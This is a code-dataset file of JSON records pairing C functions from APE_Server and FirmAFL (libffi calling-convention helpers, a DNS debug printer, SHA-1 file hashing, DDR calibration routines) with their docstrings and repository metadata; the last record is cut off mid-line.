{"docstring": "/* we borrow this routine from libffi (it must be changed, though, to\n * actually call the function passed in the first argument.  as of\n * libffi-1.20, this is not the case.)\n */\n", "func_signal": "void\nffi_raw_call(ffi_cif *cif, void (*fn)(void), void *rvalue, ffi_raw *fake_avalue)", "code": "{\n  extended_cif ecif;\n  void **avalue = (void **)fake_avalue;\n\n  ecif.cif = cif;\n  ecif.avalue = avalue;\n  \n  /* If the return value is a struct and we don't have a return */\n  /* value address then we need to make one                     */\n\n  if ((rvalue == NULL) && \n      (cif->rtype->type == FFI_TYPE_STRUCT))\n    {\n      ecif.rvalue = alloca(cif->rtype->size);\n    }\n  else\n    ecif.rvalue = rvalue;\n    \n  \n  switch (cif->abi) \n    {\n#ifdef X86_WIN32\n    case FFI_SYSV:\n    case FFI_STDCALL:\n      ffi_call_win32(ffi_prep_args_raw, &ecif, cif->bytes, cif->flags,\n                     ecif.rvalue, fn);\n      break;\n#else\n    case FFI_SYSV:\n      ffi_call_SYSV(ffi_prep_args_raw, &ecif, cif->bytes, cif->flags,\n                    ecif.rvalue, fn);\n      break;\n#endif\n    default:\n      FFI_ASSERT(0);\n      break;\n    }\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\x86\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/*====================================================================*/\n/*                                                                    */\n/* Name     - ffi_closure_helper_SYSV.                                */\n/*                                                                    */\n/* Function - Call a FFI closure target function.                     */\n/*                                                                    */\n/*====================================================================*/\n", "func_signal": "void\nffi_closure_helper_SYSV (ffi_closure *closure,\n\t\t\t unsigned long *p_gpr,\n\t\t\t unsigned long long *p_fpr,\n\t\t\t unsigned long *p_ov)", "code": "{\n  unsigned long long ret_buffer;\n\n  void *rvalue = &ret_buffer;\n  void **avalue;\n  void **p_arg;\n\n  int n_gpr = 0;\n  int n_fpr = 0;\n  int n_ov = 0;\n\n  ffi_type **ptr;\n  int i;\n\n  /* Allocate buffer for argument list pointers.  */\n\n  p_arg = avalue = alloca (closure->cif->nargs * sizeof (void *));\n\n  /* If we returning a structure, pass the structure address \n     directly to the target function.  Otherwise, have the target \n     function store the return value to the GPR save area.  */\n\n  if (closure->cif->flags == FFI390_RET_STRUCT)\n    rvalue = (void *) p_gpr[n_gpr++];\n\n  /* Now for the arguments.  */\n\n  for (ptr = closure->cif->arg_types, i = closure->cif->nargs;\n       i > 0;\n       i--, p_arg++, ptr++)\n    {\n      int deref_struct_pointer = 0;\n      int type = (*ptr)->type;\n\n#if FFI_TYPE_LONGDOUBLE != FFI_TYPE_DOUBLE\n      /* 16-byte long double is passed like a struct.  */\n      if (type == FFI_TYPE_LONGDOUBLE)\n\ttype = FFI_TYPE_STRUCT;\n#endif\n\n      /* Check how a structure type is passed.  */\n      if (type == FFI_TYPE_STRUCT)\n\t{\n\t  type = ffi_check_struct_type (*ptr);\n\n\t  /* If we pass the struct via pointer, remember to \n\t     retrieve the pointer later.  */\n\t  if (type == FFI_TYPE_POINTER)\n\t    deref_struct_pointer = 1;\n\t}\n\n      /* Pointers are passed like UINTs of the same size.  */\n      if (type == FFI_TYPE_POINTER)\n#ifdef __s390x__\n\ttype = FFI_TYPE_UINT64;\n#else\n\ttype = FFI_TYPE_UINT32;\n#endif\n\n      /* Now handle all primitive int/float data types.  */\n      switch (type) \n\t{\n\t  case FFI_TYPE_DOUBLE:\n\t    if (n_fpr < MAX_FPRARGS)\n\t      *p_arg = &p_fpr[n_fpr++];\n\t    else\n\t      *p_arg = &p_ov[n_ov], \n\t      n_ov += sizeof (double) / sizeof (long);\n\t    break;\n\t\n\t  case FFI_TYPE_FLOAT:\n\t    if (n_fpr < MAX_FPRARGS)\n\t      *p_arg = &p_fpr[n_fpr++];\n\t    else\n\t      *p_arg = (char *)&p_ov[n_ov++] + sizeof (long) - 4;\n\t    break;\n \n\t  case FFI_TYPE_UINT64:\n\t  case FFI_TYPE_SINT64:\n#ifdef __s390x__\n\t    if (n_gpr < MAX_GPRARGS)\n\t      *p_arg = &p_gpr[n_gpr++];\n\t    else\n\t      *p_arg = &p_ov[n_ov++];\n#else\n\t    if (n_gpr == MAX_GPRARGS-1)\n\t      n_gpr = MAX_GPRARGS;\n\t    if (n_gpr < MAX_GPRARGS)\n\t      *p_arg = &p_gpr[n_gpr], n_gpr += 2;\n\t    else\n\t      *p_arg = &p_ov[n_ov], n_ov += 2;\n#endif\n\t    break;\n \n\t  case FFI_TYPE_INT:\n\t  case FFI_TYPE_UINT32:\n\t  case FFI_TYPE_SINT32:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      *p_arg = (char *)&p_gpr[n_gpr++] + sizeof (long) - 4;\n\t    else\n\t      *p_arg = (char *)&p_ov[n_ov++] + sizeof (long) - 4;\n\t    break;\n \n\t  case FFI_TYPE_UINT16:\n\t  case FFI_TYPE_SINT16:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      *p_arg = (char *)&p_gpr[n_gpr++] + sizeof (long) - 2;\n\t    else\n\t      *p_arg = (char *)&p_ov[n_ov++] + sizeof (long) - 2;\n\t    break;\n\n\t  case FFI_TYPE_UINT8:\n\t  case FFI_TYPE_SINT8:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      *p_arg = (char *)&p_gpr[n_gpr++] + sizeof (long) - 1;\n\t    else\n\t      *p_arg = (char *)&p_ov[n_ov++] + sizeof (long) - 1;\n\t    break;\n \n\t  default:\n\t    FFI_ASSERT (0);\n\t    break;\n        }\n\n      /* If this is a struct passed via pointer, we need to\n\t actually retrieve that pointer.  */\n      if (deref_struct_pointer)\n\t*p_arg = *(void **)*p_arg;\n    }\n\n\n  /* Call the target function.  */\n  (closure->fun) (closure->cif, rvalue, avalue, closure->user_data);\n\n  /* Convert the return value.  */\n  switch (closure->cif->rtype->type)\n    {\n      /* Void is easy, and so is struct.  */\n      case FFI_TYPE_VOID:\n      case FFI_TYPE_STRUCT:\n#if FFI_TYPE_LONGDOUBLE != FFI_TYPE_DOUBLE\n      case FFI_TYPE_LONGDOUBLE:\n#endif\n\tbreak;\n\n      /* Floating point values are returned in fpr 0.  */\n      case FFI_TYPE_FLOAT:\n\tp_fpr[0] = (long long) *(unsigned int *) rvalue << 32;\n\tbreak;\n\n      case FFI_TYPE_DOUBLE:\n\tp_fpr[0] = *(unsigned long long *) rvalue;\n\tbreak;\n\n      /* Integer values are returned in gpr 2 (and gpr 3\n\t for 64-bit values on 31-bit machines).  */\n      case FFI_TYPE_UINT64:\n      case FFI_TYPE_SINT64:\n#ifdef __s390x__\n\tp_gpr[0] = *(unsigned long *) rvalue;\n#else\n\tp_gpr[0] = ((unsigned long *) rvalue)[0],\n\tp_gpr[1] = ((unsigned long *) rvalue)[1];\n#endif\n\tbreak;\n\n      case FFI_TYPE_POINTER:\n      case FFI_TYPE_UINT32:\n      case FFI_TYPE_UINT16:\n      case FFI_TYPE_UINT8:\n\tp_gpr[0] = *(unsigned long *) rvalue;\n\tbreak;\n\n      case FFI_TYPE_INT:\n      case FFI_TYPE_SINT32:\n      case FFI_TYPE_SINT16:\n      case FFI_TYPE_SINT8:\n\tp_gpr[0] = *(signed long *) rvalue;\n\tbreak;\n\n      default:\n        FFI_ASSERT (0);\n        break;\n    }\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\s390\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/*====================================================================*/\n/*                                                                    */\n/* Name     - ffi_check_struct_type.                                  */\n/*                                                                    */\n/* Function - Determine if a structure can be passed within a         */\n/*            general purpose or floating point register.             */\n/*                                                                    */\n/*====================================================================*/\n", "func_signal": "static int\nffi_check_struct_type (ffi_type *arg)", "code": "{\n  size_t size = arg->size;\n\n  /* If the struct has just one element, look at that element\n     to find out whether to consider the struct as floating point.  */\n  while (arg->type == FFI_TYPE_STRUCT \n         && arg->elements[0] && !arg->elements[1])\n    arg = arg->elements[0];\n\n  /* Structs of size 1, 2, 4, and 8 are passed in registers,\n     just like the corresponding int/float types.  */\n  switch (size)\n    {\n      case 1:\n        return FFI_TYPE_UINT8;\n\n      case 2:\n        return FFI_TYPE_UINT16;\n\n      case 4:\n\tif (arg->type == FFI_TYPE_FLOAT)\n          return FFI_TYPE_FLOAT;\n\telse\n\t  return FFI_TYPE_UINT32;\n\n      case 8:\n\tif (arg->type == FFI_TYPE_DOUBLE)\n          return FFI_TYPE_DOUBLE;\n\telse\n\t  return FFI_TYPE_UINT64;\n\n      default:\n\tbreak;\n    }\n\n  /* Other structs are passed via a pointer to the data.  */\n  return FFI_TYPE_POINTER;\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\s390\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/* dbgcb will only be called if verbose > 1 */\n", "func_signal": "static void\ndbgcb(int code, const struct sockaddr *sa, unsigned slen,\n      const unsigned char *pkt, int r,\n      const struct dns_query *unused_q, void *unused_data)", "code": "{\n  struct dns_parse p;\n  const unsigned char *cur, *end;\n  int numqd;\n\n  if (code > 0)\t{\n    printf(\";; trying %s.\\n\", dns_dntosp(dns_payload(pkt)));\n    printf(\";; sending %d bytes query to \", r);\n  }\n  else\n    printf(\";; received %d bytes response from \", r);\n  if (sa->sa_family == AF_INET && slen >= sizeof(struct sockaddr_in))\n    printf(\"%s port %d\\n\",\n           dns_xntop(AF_INET, &((struct sockaddr_in*)sa)->sin_addr),\n           htons(((struct sockaddr_in*)sa)->sin_port));\n#ifdef HAVE_IPv6\n  else if (sa->sa_family == AF_INET6 && slen >= sizeof(struct sockaddr_in6))\n    printf(\"%s port %d\\n\",\n           dns_xntop(AF_INET6, &((struct sockaddr_in6*)sa)->sin6_addr),\n           htons(((struct sockaddr_in6*)sa)->sin6_port));\n#endif\n  else\n    printf(\"<<unknown socket type %d>>\\n\", sa->sa_family);\n  if (code > 0 && verbose < 3) {\n    putchar('\\n');\n    return;\n  }\n\n  if (code == -2) printf(\";; reply from unexpected source\\n\");\n  if (code == -5) printf(\";; reply to a query we didn't sent (or old)\\n\");\n  if (r < DNS_HSIZE) {\n    printf(\";; short packet (%d bytes)\\n\", r);\n    return;\n  }\n  if (dns_opcode(pkt) != 0)\n    printf(\";; unexpected opcode %d\\n\", dns_opcode(pkt));\n  if (dns_tc(pkt) != 0)\n    printf(\";; warning: TC bit set, probably incomplete reply\\n\");\n\n  printf(\";; ->>HEADER<<- opcode: \");\n  switch(dns_opcode(pkt)) {\n  case 0: printf(\"QUERY\"); break;\n  case 1: printf(\"IQUERY\"); break;\n  case 2: printf(\"STATUS\"); break;\n  default: printf(\"UNKNOWN(%u)\", dns_opcode(pkt)); break;\n  }\n  printf(\", status: %s, id: %d, size: %d\\n;; flags:\",\n         dns_rcodename(dns_rcode(pkt)), dns_qid(pkt), r);\n  if (dns_qr(pkt)) printf(\" qr\");\n  if (dns_rd(pkt)) printf(\" rd\");\n  if (dns_ra(pkt)) printf(\" ra\");\n  if (dns_aa(pkt)) printf(\" aa\");\n  if (dns_tc(pkt)) printf(\" tc\");\n  numqd = dns_numqd(pkt);\n  printf(\"; QUERY: %d, ANSWER: %d, AUTHORITY: %d, ADDITIONAL: %d\\n\",\n         numqd, dns_numan(pkt), dns_numns(pkt), dns_numar(pkt));\n  if (numqd != 1)\n    printf(\";; unexpected number of entries in QUERY section: %d\\n\",\n           numqd);\n  printf(\"\\n;; QUERY SECTION (%d):\\n\", numqd);\n  cur = dns_payload(pkt);\n  end = pkt + r;\n  while(numqd--) {\n    if (dns_getdn(pkt, &cur, end, p.dnsp_dnbuf, DNS_MAXDN) <= 0 ||\n        cur + 4 > end) {\n      printf(\"; invalid query section\\n\");\n      return;\n    }\n    r = printf(\";%s.\", dns_dntosp(p.dnsp_dnbuf));\n    printf(\"%s%s\\t%s\\n\",\n           r > 23 ? \"\\t\" : r > 15 ? \"\\t\\t\" : r > 7 ? \"\\t\\t\\t\" : \"\\t\\t\\t\\t\",\n           dns_classname(dns_get16(cur+2)), dns_typename(dns_get16(cur)));\n    cur += 4;\n  }\n\n  p.dnsp_pkt = pkt;\n  p.dnsp_cur = p.dnsp_ans = cur;\n  p.dnsp_end = end;\n  p.dnsp_qdn = NULL;\n  p.dnsp_qcls = p.dnsp_qtyp = 0;\n  p.dnsp_ttl = 0xffffffffu;\n  p.dnsp_nrr = 0;\n\n  r = printsection(&p, dns_numan(pkt), \"ANSWER\");\n  if (r == 0)\n    r = printsection(&p, dns_numns(pkt), \"AUTHORITY\");\n  if (r == 0)\n    r = printsection(&p, dns_numar(pkt), \"ADDITIONAL\");\n  putchar('\\n');\n}", "path": "deps\\udns-0.0.9\\dnsget.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/* ffi_prep_args is called by the assembly routine once stack space\n   has been allocated for the function's arguments */\n", "func_signal": "void ffi_prep_args(char *stack, extended_cif *ecif)", "code": "{\n  register unsigned int i;\n  register void **p_argv;\n  register char *argp;\n  register ffi_type **p_arg;\n\n  argp = stack;\n\n  if (ecif->cif->flags == FFI_TYPE_STRUCT\n#ifdef X86_WIN64\n      && (ecif->cif->rtype->size != 1 && ecif->cif->rtype->size != 2\n          && ecif->cif->rtype->size != 4 && ecif->cif->rtype->size != 8)\n#endif\n      )\n    {\n      *(void **) argp = ecif->rvalue;\n      argp += sizeof(void*);\n    }\n\n  p_argv = ecif->avalue;\n\n  for (i = ecif->cif->nargs, p_arg = ecif->cif->arg_types;\n       i != 0;\n       i--, p_arg++)\n    {\n      size_t z;\n\n      /* Align if necessary */\n      if ((sizeof(void*) - 1) & (size_t) argp)\n        argp = (char *) ALIGN(argp, sizeof(void*));\n\n      z = (*p_arg)->size;\n#ifdef X86_WIN64\n      if (z > sizeof(ffi_arg)\n          || ((*p_arg)->type == FFI_TYPE_STRUCT\n              && (z != 1 && z != 2 && z != 4 && z != 8))\n#if FFI_TYPE_DOUBLE != FFI_TYPE_LONGDOUBLE\n          || ((*p_arg)->type == FFI_TYPE_LONGDOUBLE)\n#endif\n          )\n        {\n          z = sizeof(ffi_arg);\n          *(void **)argp = *p_argv;\n        }\n      else if ((*p_arg)->type == FFI_TYPE_FLOAT)\n        {\n          memcpy(argp, *p_argv, z);\n        }\n      else\n#endif\n      if (z < sizeof(ffi_arg))\n        {\n          z = sizeof(ffi_arg);\n          switch ((*p_arg)->type)\n            {\n            case FFI_TYPE_SINT8:\n              *(ffi_sarg *) argp = (ffi_sarg)*(SINT8 *)(* p_argv);\n              break;\n\n            case FFI_TYPE_UINT8:\n              *(ffi_arg *) argp = (ffi_arg)*(UINT8 *)(* p_argv);\n              break;\n\n            case FFI_TYPE_SINT16:\n              *(ffi_sarg *) argp = (ffi_sarg)*(SINT16 *)(* p_argv);\n              break;\n\n            case FFI_TYPE_UINT16:\n              *(ffi_arg *) argp = (ffi_arg)*(UINT16 *)(* p_argv);\n              break;\n\n            case FFI_TYPE_SINT32:\n              *(ffi_sarg *) argp = (ffi_sarg)*(SINT32 *)(* p_argv);\n              break;\n\n            case FFI_TYPE_UINT32:\n              *(ffi_arg *) argp = (ffi_arg)*(UINT32 *)(* p_argv);\n              break;\n\n            case FFI_TYPE_STRUCT:\n              *(ffi_arg *) argp = *(ffi_arg *)(* p_argv);\n              break;\n\n            default:\n              FFI_ASSERT(0);\n            }\n        }\n      else\n        {\n          memcpy(argp, *p_argv, z);\n        }\n      p_argv++;\n#ifdef X86_WIN64\n      argp += (z + sizeof(void*) - 1) & ~(sizeof(void*) - 1);\n#else\n      argp += z;\n#endif\n    }\n  \n  return;\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\x86\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/*====================================================================*/\n/*                                                                    */\n/* Name     - ffi_prep_args.                                          */\n/*                                                                    */\n/* Function - Prepare parameters for call to function.                */\n/*                                                                    */\n/* ffi_prep_args is called by the assembly routine once stack space   */\n/* has been allocated for the function's arguments.                   */\n/*                                                                    */\n/*====================================================================*/\n", "func_signal": "static void\nffi_prep_args (unsigned char *stack, extended_cif *ecif)", "code": "{\n  /* The stack space will be filled with those areas:\n\n\tFPR argument register save area     (highest addresses)\n\tGPR argument register save area\n\ttemporary struct copies\n\toverflow argument area              (lowest addresses)\n\n     We set up the following pointers:\n\n        p_fpr: bottom of the FPR area (growing upwards)\n\tp_gpr: bottom of the GPR area (growing upwards)\n\tp_ov: bottom of the overflow area (growing upwards)\n\tp_struct: top of the struct copy area (growing downwards)\n\n     All areas are kept aligned to twice the word size.  */\n\n  int gpr_off = ecif->cif->bytes;\n  int fpr_off = gpr_off + ROUND_SIZE (MAX_GPRARGS * sizeof (long));\n\n  unsigned long long *p_fpr = (unsigned long long *)(stack + fpr_off);\n  unsigned long *p_gpr = (unsigned long *)(stack + gpr_off);\n  unsigned char *p_struct = (unsigned char *)p_gpr;\n  unsigned long *p_ov = (unsigned long *)stack;\n\n  int n_fpr = 0;\n  int n_gpr = 0;\n  int n_ov = 0;\n\n  ffi_type **ptr;\n  void **p_argv = ecif->avalue;\n  int i;\n \n  /* If we returning a structure then we set the first parameter register\n     to the address of where we are returning this structure.  */\n\n  if (ecif->cif->flags == FFI390_RET_STRUCT)\n    p_gpr[n_gpr++] = (unsigned long) ecif->rvalue;\n\n  /* Now for the arguments.  */\n \n  for (ptr = ecif->cif->arg_types, i = ecif->cif->nargs;\n       i > 0;\n       i--, ptr++, p_argv++)\n    {\n      void *arg = *p_argv;\n      int type = (*ptr)->type;\n\n#if FFI_TYPE_LONGDOUBLE != FFI_TYPE_DOUBLE\n      /* 16-byte long double is passed like a struct.  */\n      if (type == FFI_TYPE_LONGDOUBLE)\n\ttype = FFI_TYPE_STRUCT;\n#endif\n\n      /* Check how a structure type is passed.  */\n      if (type == FFI_TYPE_STRUCT)\n\t{\n\t  type = ffi_check_struct_type (*ptr);\n\n\t  /* If we pass the struct via pointer, copy the data.  */\n\t  if (type == FFI_TYPE_POINTER)\n\t    {\n\t      p_struct -= ROUND_SIZE ((*ptr)->size);\n\t      memcpy (p_struct, (char *)arg, (*ptr)->size);\n\t      arg = &p_struct;\n\t    }\n\t}\n\n      /* Now handle all primitive int/pointer/float data types.  */\n      switch (type) \n\t{\n\t  case FFI_TYPE_DOUBLE:\n\t    if (n_fpr < MAX_FPRARGS)\n\t      p_fpr[n_fpr++] = *(unsigned long long *) arg;\n\t    else\n#ifdef __s390x__\n\t      p_ov[n_ov++] = *(unsigned long *) arg;\n#else\n\t      p_ov[n_ov++] = ((unsigned long *) arg)[0],\n\t      p_ov[n_ov++] = ((unsigned long *) arg)[1];\n#endif\n\t    break;\n\t\n\t  case FFI_TYPE_FLOAT:\n\t    if (n_fpr < MAX_FPRARGS)\n\t      p_fpr[n_fpr++] = (long long) *(unsigned int *) arg << 32;\n\t    else\n\t      p_ov[n_ov++] = *(unsigned int *) arg;\n\t    break;\n\n\t  case FFI_TYPE_POINTER:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      p_gpr[n_gpr++] = (unsigned long)*(unsigned char **) arg;\n\t    else\n\t      p_ov[n_ov++] = (unsigned long)*(unsigned char **) arg;\n\t    break;\n \n\t  case FFI_TYPE_UINT64:\n\t  case FFI_TYPE_SINT64:\n#ifdef __s390x__\n\t    if (n_gpr < MAX_GPRARGS)\n\t      p_gpr[n_gpr++] = *(unsigned long *) arg;\n\t    else\n\t      p_ov[n_ov++] = *(unsigned long *) arg;\n#else\n\t    if (n_gpr == MAX_GPRARGS-1)\n\t      n_gpr = MAX_GPRARGS;\n\t    if (n_gpr < MAX_GPRARGS)\n\t      p_gpr[n_gpr++] = ((unsigned long *) arg)[0],\n\t      p_gpr[n_gpr++] = ((unsigned long *) arg)[1];\n\t    else\n\t      p_ov[n_ov++] = ((unsigned long *) arg)[0],\n\t      p_ov[n_ov++] = ((unsigned long *) arg)[1];\n#endif\n\t    break;\n \n\t  case FFI_TYPE_UINT32:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      p_gpr[n_gpr++] = *(unsigned int *) arg;\n\t    else\n\t      p_ov[n_ov++] = *(unsigned int *) arg;\n\t    break;\n \n\t  case FFI_TYPE_INT:\n\t  case FFI_TYPE_SINT32:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      p_gpr[n_gpr++] = *(signed int *) arg;\n\t    else\n\t      p_ov[n_ov++] = *(signed int *) arg;\n\t    break;\n \n\t  case FFI_TYPE_UINT16:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      p_gpr[n_gpr++] = *(unsigned short *) arg;\n\t    else\n\t      p_ov[n_ov++] = *(unsigned short *) arg;\n\t    break;\n \n\t  case FFI_TYPE_SINT16:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      p_gpr[n_gpr++] = *(signed short *) arg;\n\t    else\n\t      p_ov[n_ov++] = *(signed short *) arg;\n\t    break;\n\n\t  case FFI_TYPE_UINT8:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      p_gpr[n_gpr++] = *(unsigned char *) arg;\n\t    else\n\t      p_ov[n_ov++] = *(unsigned char *) arg;\n\t    break;\n \n\t  case FFI_TYPE_SINT8:\n\t    if (n_gpr < MAX_GPRARGS)\n\t      p_gpr[n_gpr++] = *(signed char *) arg;\n\t    else\n\t      p_ov[n_ov++] = *(signed char *) arg;\n\t    break;\n \n\t  default:\n\t    FFI_ASSERT (0);\n\t    break;\n        }\n    }\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\s390\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/*\n * Output SHA-1(file contents), returns 0 if successful.\n */\n", "func_signal": "int sha1_file( char *filename, uchar digest[20] )", "code": "{\n    FILE *f;\n    size_t n;\n    sha1_context ctx;\n    uchar buf[1024];\n\n    if( ( f = fopen( filename, \"rb\" ) ) == NULL )\n        return( 1 );\n\n    sha1_starts( &ctx );\n\n    while( ( n = fread( buf, 1, sizeof( buf ), f ) ) > 0 )\n        sha1_update( &ctx, buf, (uint) n );\n\n    sha1_finish( &ctx, digest );\n\n    fclose( f );\n    return( 0 );\n}", "path": "src\\sha1.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/* !X86_WIN64 */\n", "func_signal": "static void\nffi_prep_incoming_args_SYSV(char *stack, void **rvalue, void **avalue,\n                            ffi_cif *cif)", "code": "{\n  register unsigned int i;\n  register void **p_argv;\n  register char *argp;\n  register ffi_type **p_arg;\n\n  argp = stack;\n\n#ifdef X86_WIN64\n  if (cif->rtype->size > sizeof(ffi_arg)\n      || (cif->flags == FFI_TYPE_STRUCT\n          && (cif->rtype->size != 1 && cif->rtype->size != 2\n              && cif->rtype->size != 4 && cif->rtype->size != 8))) {\n    *rvalue = *(void **) argp;\n    argp += sizeof(void *);\n  }\n#else\n  if ( cif->flags == FFI_TYPE_STRUCT ) {\n    *rvalue = *(void **) argp;\n    argp += sizeof(void *);\n  }\n#endif\n\n  p_argv = avalue;\n\n  for (i = cif->nargs, p_arg = cif->arg_types; (i != 0); i--, p_arg++)\n    {\n      size_t z;\n\n      /* Align if necessary */\n      if ((sizeof(void*) - 1) & (size_t) argp) {\n        argp = (char *) ALIGN(argp, sizeof(void*));\n      }\n\n#ifdef X86_WIN64\n      if ((*p_arg)->size > sizeof(ffi_arg)\n          || ((*p_arg)->type == FFI_TYPE_STRUCT\n              && ((*p_arg)->size != 1 && (*p_arg)->size != 2\n                  && (*p_arg)->size != 4 && (*p_arg)->size != 8)))\n        {\n          z = sizeof(void *);\n          *p_argv = *(void **)argp;\n        }\n      else\n#endif\n        {\n          z = (*p_arg)->size;\n          \n          /* because we're little endian, this is what it turns into.   */\n          \n          *p_argv = (void*) argp;\n        }\n          \n      p_argv++;\n#ifdef X86_WIN64\n      argp += (z + sizeof(void*) - 1) & ~(sizeof(void*) - 1);\n#else\n      argp += z;\n#endif\n    }\n  \n  return;\n}", "path": "deps\\js\\src\\ctypes\\libffi\\src\\x86\\ffi.c", "repo_name": "APE-Project/APE_Server", "stars": 386, "license": "gpl-2.0", "language": "c", "size": 73095}
{"docstring": "/**\n * rw_mgr_decr_vfifo() - Decrease VFIFO value\n * @grp:\tRead/Write group\n *\n * Decrease VFIFO value.\n */\n", "func_signal": "static void rw_mgr_decr_vfifo(const u32 grp)", "code": "{\n\tu32 i;\n\n\tfor (i = 0; i < misccfg->read_valid_fifo_size - 1; i++)\n\t\trw_mgr_incr_vfifo(grp);\n}", "path": "user_mode\\roms\\u-boot\\drivers\\ddr\\altera\\sequencer.c", "repo_name": "zyw-200/FirmAFL", "stars": 373, "license": "None", "language": "c", "size": 261244}
{"docstring": "/**\n * rw_mgr_mem_calibrate_write_test_issue() - Issue write test command\n * @group:\tWrite Group\n * @use_dm:\tUse DM\n *\n * Issue write test command. Two variants are provided, one that just tests\n * a write pattern and another that tests datamask functionality.\n */\n", "func_signal": "static void rw_mgr_mem_calibrate_write_test_issue(u32 group,\n\t\t\t\t\t\t  u32 test_dm)", "code": "{\n\tconst u32 quick_write_mode =\n\t\t(STATIC_CALIB_STEPS & CALIB_SKIP_WRITES) &&\n\t\tmisccfg->enable_super_quick_calibration;\n\tu32 mcc_instruction;\n\tu32 rw_wl_nop_cycles;\n\n\t/*\n\t * Set counter and jump addresses for the right\n\t * number of NOP cycles.\n\t * The number of supported NOP cycles can range from -1 to infinity\n\t * Three different cases are handled:\n\t *\n\t * 1. For a number of NOP cycles greater than 0, the RW Mgr looping\n\t *    mechanism will be used to insert the right number of NOPs\n\t *\n\t * 2. For a number of NOP cycles equals to 0, the micro-instruction\n\t *    issuing the write command will jump straight to the\n\t *    micro-instruction that turns on DQS (for DDRx), or outputs write\n\t *    data (for RLD), skipping\n\t *    the NOP micro-instruction all together\n\t *\n\t * 3. A number of NOP cycles equal to -1 indicates that DQS must be\n\t *    turned on in the same micro-instruction that issues the write\n\t *    command. Then we need\n\t *    to directly jump to the micro-instruction that sends out the data\n\t *\n\t * NOTE: Implementing this mechanism uses 2 RW Mgr jump-counters\n\t *       (2 and 3). One jump-counter (0) is used to perform multiple\n\t *       write-read operations.\n\t *       one counter left to issue this command in \"multiple-group\" mode\n\t */\n\n\trw_wl_nop_cycles = gbl->rw_wl_nop_cycles;\n\n\tif (rw_wl_nop_cycles == -1) {\n\t\t/*\n\t\t * CNTR 2 - We want to execute the special write operation that\n\t\t * turns on DQS right away and then skip directly to the\n\t\t * instruction that sends out the data. We set the counter to a\n\t\t * large number so that the jump is always taken.\n\t\t */\n\t\twritel(0xFF, &sdr_rw_load_mgr_regs->load_cntr2);\n\n\t\t/* CNTR 3 - Not used */\n\t\tif (test_dm) {\n\t\t\tmcc_instruction = rwcfg->lfsr_wr_rd_dm_bank_0_wl_1;\n\t\t\twritel(rwcfg->lfsr_wr_rd_dm_bank_0_data,\n\t\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add2);\n\t\t\twritel(rwcfg->lfsr_wr_rd_dm_bank_0_nop,\n\t\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add3);\n\t\t} else {\n\t\t\tmcc_instruction = rwcfg->lfsr_wr_rd_bank_0_wl_1;\n\t\t\twritel(rwcfg->lfsr_wr_rd_bank_0_data,\n\t\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add2);\n\t\t\twritel(rwcfg->lfsr_wr_rd_bank_0_nop,\n\t\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add3);\n\t\t}\n\t} else if (rw_wl_nop_cycles == 0) {\n\t\t/*\n\t\t * CNTR 2 - We want to skip the NOP operation and go straight\n\t\t * to the DQS enable instruction. We set the counter to a large\n\t\t * number so that the jump is always taken.\n\t\t */\n\t\twritel(0xFF, &sdr_rw_load_mgr_regs->load_cntr2);\n\n\t\t/* CNTR 3 - Not used */\n\t\tif (test_dm) {\n\t\t\tmcc_instruction = rwcfg->lfsr_wr_rd_dm_bank_0;\n\t\t\twritel(rwcfg->lfsr_wr_rd_dm_bank_0_dqs,\n\t\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add2);\n\t\t} else {\n\t\t\tmcc_instruction = rwcfg->lfsr_wr_rd_bank_0;\n\t\t\twritel(rwcfg->lfsr_wr_rd_bank_0_dqs,\n\t\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add2);\n\t\t}\n\t} else {\n\t\t/*\n\t\t * CNTR 2 - In this case we want to execute the next instruction\n\t\t * and NOT take the jump. So we set the counter to 0. The jump\n\t\t * address doesn't count.\n\t\t */\n\t\twritel(0x0, &sdr_rw_load_mgr_regs->load_cntr2);\n\t\twritel(0x0, &sdr_rw_load_jump_mgr_regs->load_jump_add2);\n\n\t\t/*\n\t\t * CNTR 3 - Set the nop counter to the number of cycles we\n\t\t * need to loop for, minus 1.\n\t\t */\n\t\twritel(rw_wl_nop_cycles - 1, &sdr_rw_load_mgr_regs->load_cntr3);\n\t\tif (test_dm) {\n\t\t\tmcc_instruction = rwcfg->lfsr_wr_rd_dm_bank_0;\n\t\t\twritel(rwcfg->lfsr_wr_rd_dm_bank_0_nop,\n\t\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add3);\n\t\t} else {\n\t\t\tmcc_instruction = rwcfg->lfsr_wr_rd_bank_0;\n\t\t\twritel(rwcfg->lfsr_wr_rd_bank_0_nop,\n\t\t\t       &sdr_rw_load_jump_mgr_regs->load_jump_add3);\n\t\t}\n\t}\n\n\twritel(0, 